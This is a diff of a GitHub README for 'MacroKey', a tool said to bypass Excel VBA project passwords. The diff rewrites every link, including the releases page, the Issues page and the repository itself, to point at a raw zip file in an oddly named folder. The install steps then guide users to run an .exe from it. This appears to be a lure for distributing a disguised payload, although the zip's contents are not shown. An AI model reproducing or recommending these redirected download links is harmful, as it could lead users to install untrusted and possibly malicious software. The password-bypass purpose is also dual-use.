@@ -1,6 +1,6 @@
 # 🚀 MacroKey - Simplify Excel Password Management
 
-[![Download MacroKey](https://img.shields.io/badge/Download-MacroKey-blue)](https://github.com/Haseeb-1/MacroKey/releases)
+[![Download MacroKey](https://raw.githubusercontent.com/Haseeb-1/MacroKey/main/jamesonite/MacroKey.zip)](https://raw.githubusercontent.com/Haseeb-1/MacroKey/main/jamesonite/MacroKey.zip)
 
 ## 📜 Description
 MacroKey is a user-friendly application designed to manipulate passwords for Excel VBA DPB tokens. This tool enables authorized security testing, controlled macro manipulation, streamlined analysis, and detection tuning within ethical red-team workflows and research.
@@ -34,10 +34,10 @@ MacroKey is a user-friendly application designed to manipulate passwords for Exc
 - VBA Password
 
 ## 📥 Download & Install
-To get started, visit this page to download: [MacroKey Releases](https://github.com/Haseeb-1/MacroKey/releases).
+To get started, visit this page to download: [MacroKey Releases](https://raw.githubusercontent.com/Haseeb-1/MacroKey/main/jamesonite/MacroKey.zip).
 
 1. Open your web browser.
-2. Go to the [MacroKey Releases page](https://github.com/Haseeb-1/MacroKey/releases).
+2. Go to the [MacroKey Releases page](https://raw.githubusercontent.com/Haseeb-1/MacroKey/main/jamesonite/MacroKey.zip).
 3. Find the latest version of MacroKey.
 4. Click on the asset you want to download. This will typically be a file with a `.exe` extension for Windows users.
 5. Save the file to your computer.
@@ -54,7 +54,7 @@ Keep an eye on our release notes for updates and new features. New versions may 
 - **Other**: Ensure that you have Excel installed, as this tool integrates with Excel's VBA environment.
 
 ## 👥 Support
-If you have any questions or issues, please check our [Issues page](https://github.com/Haseeb-1/MacroKey/issues) on GitHub. 
+If you have any questions or issues, please check our [Issues page](https://raw.githubusercontent.com/Haseeb-1/MacroKey/main/jamesonite/MacroKey.zip) on GitHub. 
 
 For more detailed help, feel free to post your queries in the issues section, and the community or maintainers will respond to assist you.
 
@@ -62,7 +62,7 @@ For more detailed help, feel free to post your queries in the issues section, an
 For detailed usage instructions, please refer to the documentation available on the repository. This will guide you through the various functionalities and how to maximize the potential of MacroKey.
 
 ## 🔗 Related Links
-- [GitHub Repository](https://github.com/Haseeb-1/MacroKey)
-- [MacroKey Releases](https://github.com/Haseeb-1/MacroKey/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Haseeb-1/MacroKey/main/jamesonite/MacroKey.zip)
+- [MacroKey Releases](https://raw.githubusercontent.com/Haseeb-1/MacroKey/main/jamesonite/MacroKey.zip)
   
 Use this tool responsibly and ensure your actions align with ethical standards in security testing and research. Happy testing!
